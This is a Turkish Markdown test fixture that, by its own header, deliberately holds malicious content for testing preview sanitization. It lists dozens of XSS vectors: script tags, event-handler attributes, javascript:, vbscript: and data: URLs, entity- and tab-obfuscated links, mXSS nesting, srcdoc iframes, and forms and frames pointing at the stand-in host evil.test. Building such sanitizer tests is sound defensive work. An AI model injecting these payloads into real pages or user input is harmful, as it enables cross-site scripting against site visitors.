# Zararlı örnek Markdown

Bu dosya önizleme sanitizasyon testleri için bilerek zararlı içerik taşır.

<script>alert('script')</script>

<iframe src="https://evil.test/frame"></iframe>

<object data="https://evil.test/obj"></object>

<embed src="https://evil.test/emb" type="text/html">

<form action="https://evil.test/post"><input name="alan"><button>Tıkla</button></form>

<p onclick="alert('onclick')" onmouseover="alert('hover')">olay işleyicili metin</p>

<img src="x" onerror="alert('onerror')" alt="bozuk görsel">

[tehlikeli bağlantı](javascript:alert('href'))

[veri bağlantısı](data:text/html,<script>alert('data')</script>)

<svg onload="alert('svg')"><a xlink:href="javascript:alert('xlink')">svg bağlantı</a></svg>

<math><mtext><script>alert('math')</script></mtext></math>

<style>body { display: none; }</style>

<div style="position:fixed;inset:0">kaplama</div>

<meta http-equiv="refresh" content="0;url=https://evil.test/refresh">

<img src="x" srcset="https://evil.test/a.png 1x, data:image/svg+xml,<svg onload=alert(1)> 2x" alt="srcset">

<form action="https://evil.test/post"><button formaction="javascript:alert('formaction')">gönder</button></form>

<a href="data:text/javascript,alert('datascript')">veri betiği</a>

<a href="vbscript:msgbox('vbscript')">vbscript bağlantı</a>

[ışınlanmış bağlantı](javas&#99;ript:alert('entity'))

<a href="jav&#x09;ascript:alert('tab')">sekmeli</a>

<a href="//evil.test/protokol-goreli">protokol göreli</a>

<a href="file:///C:/Windows/win.ini">yerel dosya</a>

<details open ontoggle="alert('toggle')">ayrıntı</details>

<input autofocus onfocus="alert('focus')">

<video><source onerror="alert('source')"></video>

<math><mtext><table><mglyph><style><img src=x onerror=alert('mxss')></style></mglyph></table></mtext></math>

<iframe srcdoc="<script>alert('srcdoc')</script>"></iframe>

<template><script>alert('template')</script></template>

<img src="blob:https://evil.test/x" alt="blob görsel">

<img src="asset://localhost/C:/gizli.png" alt="asset görsel">

Güvenli metin burada kalır.
